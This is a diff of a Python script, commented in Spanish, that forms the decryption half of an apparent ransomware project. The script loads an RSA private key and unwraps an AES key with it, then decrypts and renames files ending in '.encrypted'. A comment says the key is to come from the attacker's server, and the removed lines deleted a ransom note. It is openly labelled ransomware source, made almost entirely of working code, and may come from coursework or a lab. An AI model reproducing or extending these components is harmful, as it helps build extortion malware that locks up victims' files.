@@ -2,92 +2,65 @@ import os
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Util.Padding import unpad
-from find_files import recorrer_directorio  # Usamos la función de find_files.py
+from find_files import find_files
 
-def cargar_clave_privada(): #tiene que llegar a través de una petición al servidor del atacante. 
-    """
-    Carga la clave privada RSA desde el archivo rsa_private.pem.
-    """
+def load_private_rsa_key(): #tiene que llegar a través de una petición al servidor del atacante. 
     ruta_clave_privada = os.path.abspath("rsa_private.pem")
-    print(f"Buscando clave privada en: {ruta_clave_privada}")  # Depuración
-
     if os.path.exists(ruta_clave_privada):
         with open(ruta_clave_privada, "rb") as clave_file:
             return RSA.import_key(clave_file.read())
     else:
         raise FileNotFoundError(f"El archivo de clave privada no se encuentra en: {ruta_clave_privada}")
 
-def cargar_clave_aes_cifrada():
-    """
-    Carga la clave AES cifrada desde el archivo aes_key_encrypted.bin.
-    """
+def load_aes_key_encrypted():
     ruta_clave_aes = os.path.abspath("aes_key_encrypted.bin")
-    print(f"Buscando clave AES cifrada en: {ruta_clave_aes}")  # Depuración
-
     if os.path.exists(ruta_clave_aes):
         with open(ruta_clave_aes, "rb") as clave_file:
             return clave_file.read()
     else:
         raise FileNotFoundError(f"El archivo de clave AES cifrada no se encuentra en: {ruta_clave_aes}")
 
-def descifrar_clave_aes(clave_privada, clave_aes_cifrada):
-    """
-    Descifra la clave AES usando la clave privada RSA.
-    """
+def decrypt_aes_key_encrypted (clave_privada, clave_aes_cifrada):
     cipher_rsa = PKCS1_OAEP.new(clave_privada)
     return cipher_rsa.decrypt(clave_aes_cifrada)
 
 def descifrar_archivo(archivo, clave):
-    """
-    Descifra un archivo utilizando AES en modo CBC y sobrescribe el archivo con la versión descifrada.
-    """
     with open(archivo, "rb") as f:
         iv_y_datos_cifrados = f.read()
-    
     iv = iv_y_datos_cifrados[:16]  # El IV ocupa los primeros 16 bytes
     datos_cifrados = iv_y_datos_cifrados[16:]
-    
     cipher = AES.new(clave, AES.MODE_CBC, iv)
     datos_descifrados = unpad(cipher.decrypt(datos_cifrados), AES.block_size)
-    
     with open(archivo, "wb") as f:
         f.write(datos_descifrados)  # Sobrescribimos el archivo con los datos descifrados
 
 def descifrar_archivos():
-    """
-    Descifra todos los archivos importantes en el directorio y subdirectorios con extensión '.enc'.
-    """
-    directorio_base = os.path.expanduser("~/Desktop/Files")
-    archivos = recorrer_directorio() 
-
-    if not archivos:
-        print("No se encontraron archivos importantes.")
+    archivos = find_files()  # Ahora devuelve solo la lista de archivos (rutas completas)
+    if not archivos or not isinstance(archivos, list):  # Verifica si `archivos` es válido
+        print("Error: No se pudo obtener la lista de archivos o está vacía.")
         return
-
-    # Cargar la clave privada y la clave AES cifrada
-    clave_privada = cargar_clave_privada()
-    clave_aes_cifrada = cargar_clave_aes_cifrada()
-
-    # Descifra la clave AES con la clave privada RSA
-    clave_aes = descifrar_clave_aes(clave_privada, clave_aes_cifrada)
+    rsa_private_key = load_private_rsa_key()
+    aes_key_encrypted = load_aes_key_encrypted()
+    aes_key = decrypt_aes_key_encrypted(rsa_private_key, aes_key_encrypted)
     print("Clave AES descifrada correctamente.")
-
-    # Descifra los archivos con extensión '.enc'
     for archivo in archivos:
-        if archivo.endswith(".encrypted"):  # Verifica si el archivo tiene la extensión '.enc'
-            ruta_completa = os.path.join(directorio_base, archivo)
-            if os.path.isfile(ruta_completa):
-                # Descifra el archivo
-                descifrar_archivo(ruta_completa, clave_aes)
-                # Renombrar el archivo eliminando la extensión '.enc'
-                nueva_ruta = ruta_completa[:-10]  # Elimina la extensión '.enc'
-                os.rename(ruta_completa, nueva_ruta)
-                print(f"Archivo descifrado y renombrado: {ruta_completa} -> {nueva_ruta}")
-
+        if archivo.endswith(".encrypted") and os.path.isfile(archivo):  # Verifica extensión y que es un archivo válido
+            print(f"Descifrando: {archivo}")  # Depuración
+            descifrar_archivo(archivo, aes_key)
+            nueva_ruta = archivo[:-10]  # Elimina la extensión '.encrypted'
+            # Manejo de errores al renombrar
+            try:
+                os.rename(archivo, nueva_ruta)
+                print(f"Archivo descifrado y renombrado: {archivo} -> {nueva_ruta}")
+            except OSError as e:
+                print(f"Error al renombrar el archivo {archivo}: {e}")
+    # Eliminar la clave AES cifrada después del proceso
+    try:
+        os.remove("aes_key_encrypted.bin")
+        print("Clave AES cifrada eliminada.")
+    except FileNotFoundError:
+        print("Advertencia: No se encontró aes_key_encrypted.bin para eliminar.")
     print("Archivos descifrados correctamente.")
-    ruta_reporte = os.path.join(directorio_base, "ransom_note.txt")
-    if os.path.exists(ruta_reporte):
-        os.remove(ruta_reporte)
 
 if __name__ == "__main__":
     descifrar_archivos()
